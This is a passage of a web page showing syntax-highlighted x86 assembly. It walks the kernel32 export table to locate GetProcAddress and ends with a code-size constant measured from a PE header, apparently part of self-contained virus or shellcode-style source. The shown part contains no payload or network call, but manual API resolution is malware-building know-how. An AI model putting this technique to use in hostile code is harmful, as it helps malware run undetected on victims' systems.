    </span><span class="sc1">;we can just lodsd instead of Mov eax,[]</span><span class="sc0">
    </span><span class="sc1">;then stosd instead of mov [],eax</span><span class="sc0">
    </span><span class="sc6">Lodsd</span><span class="sc0">                             </span><span class="sc1">;save base</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">Lodsd</span><span class="sc0">                           </span><span class="sc1">;Load the Total</span><span class="sc0">
                    </span><span class="sc1">;number of Exports but trash</span><span class="sc0">

    </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">;get and save the Limit</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">;this is the number of both</span><span class="sc0">
    </span><span class="sc1">;named and unamed functions Eported</span><span class="sc0">

    </span><span class="sc6">Lodsd</span><span class="sc0">                           </span><span class="sc1">;get and save the address to</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;the function's</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">

    </span><span class="sc6">Lodsd</span><span class="sc0">                           </span><span class="sc1">;get and save the address to</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;the names of the function</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">

    </span><span class="sc6">Lodsd</span><span class="sc0">                           </span><span class="sc1">;get and save the address to</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;the ordinals of the function</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc5">gaLookLoop</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Esi</span><span class="sc4">,[</span><span class="sc5">@@gaAddName</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;first adrress of the first name</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">@@gaNindex</span><span class="sc4">],</span><span class="sc8">Esi</span><span class="sc0">   </span><span class="sc1">;store where we are</span><span class="sc0">

    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Edi</span><span class="sc4">,</span><span class="sc8">Ebx</span><span class="sc0">                </span><span class="sc1">;get the load Add of K32</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">Ecx</span><span class="sc4">,</span><span class="sc8">Ecx</span><span class="sc0">
</span><span class="sc5">gaTryAgain</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;find GetProcAddress</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Edi</span><span class="sc4">],</span><span class="sc12">'PteG'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">gaNextOne</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'Acor'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">gaNextOne</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc12">'erdd'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">gaNextOne</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">Edi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc12">'ss'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">gaNextOne</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Edi</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">gaNextOne</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gaGotGetProcAdd</span><span class="sc0">

</span><span class="sc5">gaNextOne</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">Ecx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">Ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@gaLimit</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">gaNotFound1</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@gaNindex</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@gaNindex</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">Ebx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gaTryAgain</span><span class="sc0">
</span><span class="sc5">gaGotGetProcAdd</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;ok we have the index into the name array use this to get</span><span class="sc0">
</span><span class="sc1">; the index into the ord array</span><span class="sc0">

    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">Ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;*2 for a word array</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@gaAddOrd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">Esi</span><span class="sc4">,</span><span class="sc8">Ecx</span><span class="sc0">         </span><span class="sc1">;move to the correct spot in the array</span><span class="sc0">

    </span><span class="sc6">Movzx</span><span class="sc0">   </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc1">;ax = ordinal value</span><span class="sc0">

    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;*4</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@gaAddFunc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">Eax</span><span class="sc0">

    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">Edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;got the address of it</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">Edi</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@gaGetPAdd</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gaOkFound</span><span class="sc0">

</span><span class="sc5">gaNotFound1</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">                   </span><span class="sc1">;damn not found</span><span class="sc0">
                          </span><span class="sc1">;set the eax to 0</span><span class="sc0">

</span><span class="sc5">gaOkFound</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">Eax</span><span class="sc0">              </span><span class="sc1">;add the VA to it</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">gaOK</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc8">Eax</span><span class="sc0">           </span><span class="sc1">;set Eax to zero for Popa</span><span class="sc0">

</span><span class="sc5">gaOK</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">

    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc1">;------------------------------</span><span class="sc0">
 

</span><span class="sc5">VSize</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0">

</span><span class="sc5">fBuff</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">400h</span><span class="sc0"> </span><span class="sc9">Dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

 
  
         </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">Begin</span><span class="sc0">




</span></div></body>
</html>
